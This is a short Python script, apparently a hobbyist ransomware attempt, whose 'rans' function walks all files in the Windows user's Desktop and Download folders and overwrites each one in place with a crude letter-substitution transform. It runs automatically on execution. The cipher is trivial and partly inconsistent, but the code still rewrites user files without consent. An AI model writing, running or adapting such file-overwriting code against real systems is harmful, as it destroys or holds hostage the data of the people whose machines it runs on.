import os
#import requests


def c(v,f):
	keys = [
		"0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23"
	]
	keys_a = [
		"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","w","q","z"
	]
	for i in range(0,len(keys)):
		#v = v.replace(keys_a[i], " r"+keys[i]+" ")

		v = v.replace(" r"+keys[i]+" ", keys_a[i])
		
        #print(v)
	print(v)
	f.write(v)

def e(veri):
	with open(veri,"r") as x:
		x = x.read()
	with open(veri, "w") as y:
		"""
		for z in range(0,len(x)):
			#print(x(z))
			c(x[z],y)
		"""
		c(x,y)
		
def rans(k):
	for konum, gereksiz, liste in os.walk(k):
		if liste:
			for dosya in liste:
				veri = konum+"/"+dosya
				e(veri)
rans(os.path.join(os.environ["HOMEPATH"], "Desktop"))
rans(os.path.join(os.environ["HOMEPATH"], "Download"))
